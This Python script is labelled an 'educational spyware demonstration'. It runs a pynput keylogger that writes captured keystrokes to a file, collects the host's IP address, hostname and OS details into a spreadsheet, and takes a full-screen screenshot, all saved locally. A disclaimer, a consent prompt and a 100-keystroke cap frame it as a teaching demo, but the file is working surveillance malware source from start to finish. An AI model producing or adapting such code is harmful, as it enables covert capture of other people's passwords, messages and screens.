import sqlite3
import datetime
import socket
import platform
import os
import time
from pynput.keyboard import Key, Listener
import pandas as pd
from PIL import ImageGrab

# Configuration
class Config:
    OUTPUT_DIR = "output"
    KEYLOG_FILE = os.path.join(OUTPUT_DIR, "keystrokes.txt")
    SYSTEM_INFO_FILE = os.path.join(OUTPUT_DIR, "system_info.xlsx")
    SCREENSHOT_FILE = os.path.join(OUTPUT_DIR, "screenshot.png")
    MAX_KEYSTROKES = 100  # Limit for demonstration purposes

class SpywareDemo:
    def __init__(self):
        self.keystrokes = []
        self.setup_directories()
    
    def setup_directories(self):
        """Create output directory if it doesn't exist"""
        if not os.path.exists(Config.OUTPUT_DIR):
            os.makedirs(Config.OUTPUT_DIR)
    
    def on_press(self, key):
        """Callback for key press events"""
        if len(self.keystrokes) < Config.MAX_KEYSTROKES:
            self.keystrokes.append(key)
            self.write_keystrokes()
            print(f"Key pressed: {key}")
        else:
            return False
    
    def on_release(self, key):
        """Callback for key release events"""
        if key == Key.esc:
            print("Stopping keylogger...")
            return False
    
    def write_keystrokes(self):
        """Write keystrokes to file"""
        try:
            with open(Config.KEYLOG_FILE, "w", encoding='utf-8') as f:
                for key in self.keystrokes:
                    key_str = str(key).replace("'", "")
                    if 'Key.' in key_str:
                        key_str = f"[{key_str}]"
                    f.write(key_str + " ")
        except Exception as e:
            print(f"Error writing keystrokes: {e}")
    
    def collect_system_info(self):
        """Collect and save system information"""
        try:
            system_info = {
                'Timestamp': [datetime.datetime.now()],
                'IP Address': [socket.gethostbyname(socket.gethostname())],
                'Hostname': [socket.gethostname()],
                'OS': [platform.system()],
                'OS Version': [platform.release()],
                'Processor': [platform.processor()],
                'Architecture': [platform.architecture()[0]],
                'Machine': [platform.machine()]
            }
            
            df = pd.DataFrame(system_info)
            df.to_excel(Config.SYSTEM_INFO_FILE, index=False)
            print(f"System info saved to {Config.SYSTEM_INFO_FILE}")
            
        except Exception as e:
            print(f"Error collecting system info: {e}")
    
    def take_screenshot(self):
        """Capture and save screenshot"""
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(Config.SCREENSHOT_FILE)
            print(f"Screenshot saved to {Config.SCREENSHOT_FILE}")
        except Exception as e:
            print(f"Error taking screenshot: {e}")
    
    def demonstrate_keylogger(self, duration=30):
        """Demonstrate keylogging for specified duration"""
        print(f"Keylogger demonstration starting for {duration} seconds...")
        print("Press ESC key to stop early")
        
        # Start listener in non-blocking mode
        listener = Listener(on_press=self.on_press, on_release=self.on_release)
        listener.start()
        
        # Run for specified duration or until ESC is pressed
        start_time = time.time()
        while time.time() - start_time < duration:
            if not listener.running:
                break
            time.sleep(0.1)
        
        listener.stop()
        print("Keylogger demonstration completed")
    
    def run_demonstration(self):
        """Run complete demonstration"""
        print("=== Educational Spyware Demonstration ===")
        print("Starting system information collection...")
        self.collect_system_info()
        
        print("Starting keylogger demonstration...")
        self.demonstrate_keylogger(duration=30)
        
        print("Taking screenshot...")
        self.take_screenshot()
        
        print("\n=== Demonstration Complete ===")
        print(f"All outputs saved to '{Config.OUTPUT_DIR}' directory")
        print("Files created:")
        print(f"  - {Config.KEYLOG_FILE} (Keystrokes)")
        print(f"  - {Config.SYSTEM_INFO_FILE} (System Information)")
        print(f"  - {Config.SCREENSHOT_FILE} (Screenshot)")

if __name__ == "__main__":
    # Display disclaimer
    print("=" * 60)
    print("EDUCATIONAL SPYWARE DEMONSTRATION")
    print("=" * 60)
    print("DISCLAIMER: This software is for educational purposes only.")
    print("It demonstrates how spyware can collect system information.")
    print("Unauthorized use on systems you don't own is illegal.")
    print("=" * 60)
    
    consent = input("Do you understand and agree to run this demonstration? (yes/no): ")
    
    if consent.lower() in ['yes', 'y']:
        demo = SpywareDemo()
        demo.run_demonstration()
    else:
        print("Demonstration cancelled.")